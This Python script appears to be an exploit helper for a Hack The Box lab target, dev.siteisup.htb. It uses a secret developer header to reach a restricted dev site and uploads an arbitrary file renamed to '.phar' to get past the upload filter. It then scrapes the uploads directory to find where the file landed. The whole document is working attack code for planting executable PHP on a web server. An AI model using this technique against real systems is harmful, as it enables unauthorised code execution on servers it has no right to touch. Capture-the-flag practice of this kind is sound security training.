#!/usr/bin/python3
# Author: Hack.You 
import requests
import sys
from bs4 import BeautifulSoup

if len(sys.argv) < 2:
    print(f'Usage: python3 {sys.argv[0]} <file_2_upload>')
    sys.exit(1)

url = 'http://dev.siteisup.htb/'
file_path = sys.argv[1]
with open(file_path, 'rb') as f:
    file_content = f.read()

headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'multipart/form-data; boundary=---------------------------40356032783970679370836900642',
    'Content-Length': str(len(file_content) + len(b'--\r\nContent-Disposition: form-data; name="check"\r\n\r\nCheck\r\n')),
    'Origin': 'http://dev.siteisup.htb',
    'Connection': 'close',
    'Referer': 'http://dev.siteisup.htb/',
    'Upgrade-Insecure-Requests': '1',
    'Special-Dev': 'only4dev'
}

file = {'file': ('test.phar', file_content)}
check = {'check': 'Check'}

data = b''
for key, value in file.items():
    data += b'--' + bytes(headers['Content-Type'].split('=')[1], 'utf-8') + b'\r\n'
    data += bytes('Content-Disposition: form-data; name="{}"; filename="{}"\r\n'.format(key, value[0]), 'utf-8')
    data += b'Content-Type: application/octet-stream\r\n\r\n'
    data += value[1] + b'\r\n'

for key, value in check.items():
    data += b'--' + bytes(headers['Content-Type'].split('=')[1], 'utf-8') + b'\r\n'
    data += bytes('Content-Disposition: form-data; name="{}"\r\n\r\n'.format(key), 'utf-8')
    data += bytes(value, 'utf-8') + b'\r\n'

data += b'--' + bytes(headers['Content-Type'].split('=')[1], 'utf-8') + b'--\r\n'

proxy = {'http': 'http://127.0.0.1:8080'}

upload_file = requests.post(url, data=data, headers=headers, proxies=proxy)

uploaded = 'http://dev.siteisup.htb/uploads'
headers = {'Special-Dev': 'only4dev'}
response = requests.get(uploaded, headers=headers)
soup = BeautifulSoup(response.text, 'html.parser')
uploaded_file = soup.find_all('a')[5].get('href')
print(f"File uploaded at /uploads/{uploaded_file}")
